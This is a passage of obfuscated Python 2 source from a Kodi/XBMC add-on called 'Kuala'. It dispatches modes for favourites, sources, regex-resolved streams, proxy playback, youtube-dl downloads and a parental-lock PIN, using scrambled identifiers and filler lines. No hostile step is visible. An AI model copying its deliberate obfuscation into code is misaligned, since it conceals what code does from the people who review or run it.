elif Iiiii == 2 :
 i1IIiiiii ( "getChannelItems" )
 OO ( IiI1 , oo0oOo , OOO0OOO00oo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 71 - 71: o0oO0 - ii11ii1ii - o0000oOoOoO0o
elif Iiiii == 3 :
 i1IIiiiii ( "getSubChannelItems" )
 oOo0O0o00o ( IiI1 , oo0oOo , OOO0OOO00oo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 28 - 28: IIii1I
elif Iiiii == 4 :
 i1IIiiiii ( "getFavorites" )
 Ii1Ii1I ( )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 7 - 7: ii11ii1ii % O0oO * OOooOOo
elif Iiiii == 5 :
 i1IIiiiii ( "addFavorite" )
 try :
  IiI1 = IiI1 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  IiI1 = IiI1 . split ( '  - ' ) [ 0 ]
 except :
  pass
 IiIIiii1I ( IiI1 , oo0oOo , oOO0oo , OOO0OOO00oo , oo0o00OO )
 if 58 - 58: O0oO / o00O0oo + iIiiiI1IiI1I1 % IIII - II1
elif Iiiii == 6 :
 i1IIiiiii ( "rmFavorite" )
 try :
  IiI1 = IiI1 . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  IiI1 = IiI1 . split ( '  - ' ) [ 0 ]
 except :
  pass
 O00o0oo0oOO ( IiI1 )
 if 25 - 25: OOooOOo % II1 * IiIIi1I1Iiii - O00ooooo00 * iIiiiI1IiI1I1 * OoOO0ooOOoo0O
elif Iiiii == 7 :
 i1IIiiiii ( "addSource" )
 Ii1i11IIii1I ( oo0oOo )
 if 30 - 30: o00O0oo % OOooOOo / OoOO * OOO0O0O0ooooo * oO0o0ooO0 . IIiIiII11i
elif Iiiii == 8 :
 i1IIiiiii ( "rmSource" )
 IIi ( IiI1 )
 if 46 - 46: OOooOOo - OOO0O0O0ooooo
elif Iiiii == 9 :
 i1IIiiiii ( "download_file" )
 oooO0o0O0oo0o ( IiI1 , oo0oOo )
 if 70 - 70: o00O0oo + IiIIi1I1Iiii * IIii1I . IIiIiII11i * o00O0oo
elif Iiiii == 10 :
 i1IIiiiii ( "getCommunitySources" )
 O0ooo0O0oo0 ( )
 if 49 - 49: ii11ii1ii
elif Iiiii == 11 :
 i1IIiiiii ( "addSource" )
 Ii1i11IIii1I ( oo0oOo )
 if 25 - 25: IIII . II1 * IIii1I . ii11ii1ii / OOO0O0O0ooooo + oO0o0ooO0
elif Iiiii == 12 :
 i1IIiiiii ( "setResolvedUrl" )
 if not oo0oOo . startswith ( "plugin://plugin" ) or not any ( x in oo0oOo for x in Oo0Ooo ) :
  O0O0Oooo0o = xbmcgui . ListItem ( path = oo0oOo )
  xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , O0O0Oooo0o )
 else :
  print 'Not setting setResolvedUrl'
  xbmc . executebuiltin ( 'XBMC.RunPlugin(' + oo0oOo + ')' )
  if 68 - 68: IiIIi1I1Iiii
  if 22 - 22: o0000oOoOoO0o
elif Iiiii == 13 :
 i1IIiiiii ( "play_playlist" )
 OOO000000OOO0 ( IiI1 , O0OoooO0 )
 if 22 - 22: IIII * o00O0oo - IiIIi1I1Iiii * OOO0O0O0ooooo / i11iIiiIii
elif Iiiii == 14 :
 i1IIiiiii ( "get_xml_database" )
 IiI11iII1 ( oo0oOo )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 78 - 78: IiIIi1I1Iiii * OOO0O0O0ooooo / i11Ii11I1Ii1i + II1 + o0000oOoOoO0o
elif Iiiii == 15 :
 i1IIiiiii ( "browse_xml_database" )
 IiI11iII1 ( oo0oOo , True )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 23 - 23: IIII % II1 / IIii1I + OoOO / O00ooooo00 / ii11ii1ii
elif Iiiii == 16 :
 i1IIiiiii ( "browse_community" )
 O0ooo0O0oo0 ( oo0oOo , browse = True )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 94 - 94: O00ooooo00
elif Iiiii == 17 :
 i1IIiiiii ( "getRegexParsed" )
 if 36 - 36: IIiIiII11i + IiIIi1I1Iiii
 ooOoo0O = None
 if iiIIiiIi1Ii11 and 'listrepeat' in urllib . unquote_plus ( iiIIiiIi1Ii11 ) :
  oOOoo0o0OOOO , i1IiII1III , IiIiII1 , iiIIiiIi1Ii11 = iiI11i1II ( iiIIiiIi1Ii11 , oo0oOo )
  if 46 - 46: IIII
  ii1IiIiI1 = ''
  if 65 - 65: O00ooooo00 . OoOO / i11Ii11I1Ii1i
  if 11 - 11: O0oO * i11Ii11I1Ii1i / i11Ii11I1Ii1i - o0000oOoOoO0o
  OoO0o0OOOO = IiIiII1 [ 'name' ]
  II1iO00Oo = iiIIiiIi1Ii11 . pop ( OoO0o0OOOO )
  if 38 - 38: O00ooooo00 . i11iIiiIii
  oo0oOo = ''
  import copy
  O0ooO0O0Ooo0o = ''
  for IIi11IIiIi1i in i1IiII1III :
   try :
    IiiOoo0o0ooooOOo = copy . deepcopy ( iiIIiiIi1Ii11 )
    if 79 - 79: i11Ii11I1Ii1i
    iI1111i = oOOoo0o0OOOO
    OOO00 = 0
    for OOO00 in range ( len ( IIi11IIiIi1i ) ) :
     if 39 - 39: o0oO0 % II1 - iIiiiI1IiI1I1 % OOooOOo + OoOO0ooOOoo0O + OOO0O0O0ooooo
     if len ( IiiOoo0o0ooooOOo ) > 0 :
      for iii , O000OOO in IiiOoo0o0ooooOOo . iteritems ( ) :
       if O000OOO is not None :
        for o0IIi1 , O00O00o in O000OOO . iteritems ( ) :
         if O00O00o is not None :
          if 4 - 4: o0000oOoOoO0o - OoOO0ooOOoo0O % OOooOOo / iIiiiI1IiI1I1 % OoOO0ooOOoo0O
          if 96 - 96: oO0o0ooO0 . o0oO0 - OoOO + ii11ii1ii * Ooo00oOo00o / IIII
          if 26 - 26: o0000oOoOoO0o * IiIIi1I1Iiii
          if 31 - 31: o00O0oo * OoOO0ooOOoo0O . oO0o0ooO0
          if type ( O00O00o ) is dict :
           for i1Ii11ii1I , OO0oI1iii1i in O00O00o . iteritems ( ) :
            if OO0oI1iii1i is not None :
             O00O00o [ i1Ii11ii1I ] = OO0oI1iii1i . replace ( '[' + OoO0o0OOOO + '.param' + str ( OOO00 + 1 ) + ']' , IIi11IIiIi1i [ OOO00 ] . decode ( 'utf-8' ) )
          else :
           O000OOO [ o0IIi1 ] = O00O00o . replace ( '[' + OoO0o0OOOO + '.param' + str ( OOO00 + 1 ) + ']' , IIi11IIiIi1i [ OOO00 ] . decode ( 'utf-8' ) )
     iI1111i = iI1111i . replace ( '[' + OoO0o0OOOO + '.param' + str ( OOO00 + 1 ) + ']' , IIi11IIiIi1i [ OOO00 ] . decode ( 'utf-8' ) )
     if 91 - 91: OoOO0ooOOoo0O - II1 * iIiiiI1IiI1I1
     if 38 - 38: OoOO + OOooOOo
     if 68 - 68: OOO0O0O0ooooo
    o0oOoO00 = ''
    if len ( IiiOoo0o0ooooOOo ) > 0 :
     o0oOoO00 = iIi1 ( IiiOoo0o0ooooOOo , 'lsproroot' )
     o0oOoO00 = o0oOoO00 . split ( '<lsproroot>' ) [ 1 ] . split ( '</lsproroot' ) [ 0 ]
     if 94 - 94: Ooo00oOo00o + O0oO + i11Ii11I1Ii1i
    O0ooO0O0Ooo0o += '\n<item>%s\n%s</item>' % ( iI1111i , o0oOoO00 )
   except : traceback . print_exc ( file = sys . stdout )
   if 82 - 82: IiIIi1I1Iiii - IiIIi1I1Iiii . IIii1I / o0000oOoOoO0o + O0oO % IIii1I
   if 61 - 61: o0000oOoOoO0o / IiIIi1I1Iiii % o0000oOoOoO0o - Ooo00oOo00o + i11Ii11I1Ii1i / i11Ii11I1Ii1i
   if 82 - 82: IiIIi1I1Iiii
   if 5 - 5: Ooo00oOo00o / Ooo00oOo00o - OOO0O0O0ooooo - o0oO0 + o0oO0
   if 99 - 99: o00O0oo * II1 / ii11ii1ii . O0oO - IIii1I - oO0o0ooO0
  i11Iiii ( '' , '' , O0ooO0O0Ooo0o )
  xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 else :
  oo0oOo , oOoOO = iiI11i1II ( iiIIiiIi1Ii11 , oo0oOo )
  if oo0oOo :
   if '$PLAYERPROXY$=' in oo0oOo :
    oo0oOo , I11i = oo0oOo . split ( '$PLAYERPROXY$=' )
    print 'proxy' , I11i
    I1iIiIii , OO0 = I11i . split ( ':' )
    OOooO ( oo0oOo , IiI1 , oOO0oo , I1iIiIii , OO0 )
   else :
    i11ii ( oo0oOo , IiI1 , oOO0oo , oOoOO )
  else :
   xbmc . executebuiltin ( "XBMC.Notification(Kuala,Failed to extract regex. - " + "this" + ",4000," + oO0o0o0ooO0oO + ")" )
elif Iiiii == 18 :
 i1IIiiiii ( "youtubedl" )
 try :
  import youtubedl
 except Exception :
  xbmc . executebuiltin ( "XBMC.Notification(Kuala,Please [COLOR yellow]install Youtube-dl[/COLOR] module ,10000," ")" )
 OOoO00 = youtubedl . single_YD ( oo0oOo )
 i11ii ( OOoO00 , IiI1 , oOO0oo )
elif Iiiii == 19 :
 i1IIiiiii ( "Genesiscommonresolvers" )
 i11ii ( oOOO0 ( oo0oOo ) , IiI1 , oOO0oo , True )
 if 17 - 17: oO0o0ooO0 * iIiiiI1IiI1I1 / O0oO + IIii1I . o00O0oo - OOO0O0O0ooooo
elif Iiiii == 20 :
 iIi1ii1I1 ( )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 70 - 70: oO0o0ooO0 * OoOO0ooOOoo0O - o00O0oo + IiIIi1I1Iiii % OoOO - O0oO
elif Iiiii == 21 :
 i1IIiiiii ( "download current file using youtube-dl service" )
 II1ii ( '' , IiI1 , 'video' )
elif Iiiii == 23 :
 i1IIiiiii ( "get info then download" )
 II1ii ( oo0oOo , IiI1 , 'video' )
elif Iiiii == 24 :
 i1IIiiiii ( "Audio only youtube download" )
 II1ii ( oo0oOo , IiI1 , 'audio' )
elif Iiiii == 25 :
 i1IIiiiii ( "Searchin Other plugins" )
 o0oO0OO00oo0o ( oo0oOo , IiI1 )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
elif Iiiii == 55 :
 i1IIiiiii ( "enabled lock" )
 oOOO0ooOO = OOo . getSetting ( 'parentalblockedpin' )
 OO00Oo = xbmc . Keyboard ( '' , 'Enter Pin' )
 OO00Oo . doModal ( )
 if not ( OO00Oo . isConfirmed ( ) == False ) :
  O0OOO0OOoO0O = OO00Oo . getText ( )
  if O0OOO0OOoO0O == oOOO0ooOO :
   OOo . setSetting ( 'parentalblocked' , "false" )
   xbmc . executebuiltin ( "XBMC.Notification(Kuala,Parental Block Disabled,5000," + oO0o0o0ooO0oO + ")" )
  else :
   xbmc . executebuiltin ( "XBMC.Notification(Kuala,Wrong Pin??,5000," + oO0o0o0ooO0oO + ")" )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
elif Iiiii == 56 :
 i1IIiiiii ( "disable lock" )
 OOo . setSetting ( 'parentalblocked' , "true" )
 xbmc . executebuiltin ( "XBMC.Notification(Kuala,Parental block enabled,5000," + oO0o0o0ooO0oO + ")" )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 81 - 81: OOO0O0O0ooooo . OOO0O0O0ooooo
elif Iiiii == 53 :
 i1IIiiiii ( "Requesting JSON-RPC Items" )
 IiIi ( oo0oOo )
 if 75 - 75: IIii1I % O0oO + OoOO * OOO0O0O0ooooo . IIII - i11Ii11I1Ii1i
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
